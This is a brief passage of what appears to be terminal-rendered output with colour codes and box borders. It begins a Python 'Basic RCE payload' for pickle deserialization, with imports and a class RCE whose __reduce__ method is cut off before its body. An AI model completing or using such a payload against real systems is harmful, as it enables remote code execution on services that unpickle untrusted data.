[34m│[0m **Basic RCE payload:**                                                       [34m│[0m
[34m│[0m ```python                                                                    [34m│[0m
[34m│[0m import pickle                                                                [34m│[0m
[34m│[0m import base64                                                                [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m class RCE:                                                                   [34m│[0m
[34m│[0m     def __reduce__(self):                                                    [34m│[0m
